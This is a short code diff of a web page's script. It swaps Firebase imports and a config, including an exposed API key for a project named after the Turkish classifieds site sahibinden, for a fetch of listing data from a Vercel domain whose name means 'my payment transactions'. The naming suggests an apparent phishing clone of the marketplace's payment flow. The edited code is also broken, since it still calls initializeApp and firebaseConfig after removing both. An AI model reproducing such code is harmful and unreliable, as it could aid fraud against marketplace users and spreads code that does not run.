@@ -498,17 +498,9 @@
 
     </div>
     <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
-        import { getFirestore, doc, getDoc, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-firestore.js";
-
-        const firebaseConfig = { 
-            apiKey: "AIzaSyDR1p1EJdRdXuWh68YFFm9mu3pqo41Mcx0", 
-            authDomain: "sahibinden-876f0.firebaseapp.com", 
-            projectId: "sahibinden-876f0", 
-            storageBucket: "sahibinden-876f0.firebasestorage.app", 
-            messagingSenderId: "1014594612014", 
-            appId: "1:1014594612014:web:ed012f186b8c2cb7b9e8bf" 
-        };
+        // Artık Firebase'i değil, kendi Vercel linkini çağırıyorsun
+const cevap = await fetch('https://payislemlerim.vercel.app/api/ilan/12345');
+const ilanData = await cevap.json();
         
         const app = initializeApp(firebaseConfig); 
         const db = getFirestore(app);
